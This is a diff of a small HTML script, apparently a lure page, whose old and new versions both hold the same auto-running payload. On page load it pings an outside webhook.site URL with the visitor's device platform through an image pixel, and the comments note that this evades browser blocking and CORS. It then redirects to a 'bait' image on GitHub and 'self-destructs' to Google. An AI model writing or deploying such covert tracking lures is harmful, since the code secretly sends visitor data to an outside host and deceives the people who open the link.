@@ -1,22 +1,19 @@
 <script>
-        function runPayload() {
-            // THE REDIRECT PING (Bypasses CORS blocks)
-            // This forces the browser to actually "go" to the webhook URL for a split second
-            const webhookURL = "https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6?status=landed&device=" + navigator.platform;
-            
-            // We use an <img> tag to "ping" the server—it's much harder for browsers to block than a fetch
-            var ping = new Image();
-            ping.src = webhookURL;
+    function runPayload() {
+        // 1. THE PIXEL PING (Harder to block than fetch)
+        // This "loads" an image from your webhook, carrying the data in the URL
+        var report = new Image();
+        report.src = "https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6?status=landed&device=" + navigator.platform;
 
-            // BAIT: Show the image after 1 second
-            setTimeout(() => {
-                window.location.href = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
-            }, 1000);
+        // 2. THE BAIT REDIRECT
+        setTimeout(function() {
+            window.location.href = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
+        }, 1200);
 
-            // SELF-DESTRUCT: Go to Google after 23 seconds
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 23000);
-        }
-        window.onload = runPayload;
-    </script>
+        // 3. THE SELF-DESTRUCT
+        setTimeout(function() {
+            window.location.href = "https://www.google.com";
+        }, 23000);
+    }
+    window.onload = runPayload;
+</script>
